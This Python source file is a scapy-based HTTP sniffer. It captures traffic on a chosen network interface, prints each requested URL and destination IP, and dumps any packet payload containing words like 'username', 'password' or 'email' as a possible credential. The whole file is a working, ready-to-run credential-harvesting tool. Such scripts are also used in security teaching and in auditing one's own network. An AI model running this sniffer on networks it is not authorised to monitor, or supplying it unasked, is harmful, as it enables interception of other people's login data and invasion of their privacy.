import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    """Get the network interface from the command line or list available interfaces."""
    parser = argparse.ArgumentParser(description="HTTP traffic sniffer")
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface to sniff traffic")
    arguments = parser.parse_args()

    if arguments.interface:
        return arguments.interface

    # If no interface is provided, list available ones
    interfaces = scapy.get_if_list()
    print("[*] Available interfaces:")
    for idx, iface in enumerate(interfaces, start=1):
        print(f"{idx}. {iface}")

    while True:
        try:
            choice = int(input("Enter the number of the interface to use: "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print(f"[!] Invalid choice. Please select a number between 1 and {len(interfaces)}.")
        except ValueError:
            print("[!] Invalid input. Please enter a valid number.")

def sniff(iface):
    """Sniff packets on the specified interface."""
    try:
        print(f"[*] Starting packet sniffing on interface: {iface}")
        scapy.sniff(iface=iface, store=False, prn=process_packet)
    except PermissionError:
        print("[!] Permission denied. Please run the script as root.")
    except Exception as e:
        print(f"[!] Error: {e}")

def process_packet(packet):
    """Process each captured packet."""
    if packet.haslayer(http.HTTPRequest):
        try:
            # Get Host and Path
            host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else "Unknown"
            path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else "Unknown"
            dest_ip = packet[scapy.IP].dst  # Destination IP address
            print(f"[+] HTTP Request >> {host}{path} (Destination: {dest_ip})")
        except AttributeError:
            print("[!] Error decoding HTTP host/path or retrieving destination address")

        # Check for potential username/password data in the payload
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode(errors="ignore")  # Decode byte string
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load.lower():  # Case-insensitive match for keys
                        print(f"[+] Possible credential detected >> {load}")
                        break
            except Exception as e:
                print(f"[!] Error processing Raw load: {e}")

# Main script execution
iface = get_interface()
sniff(iface)
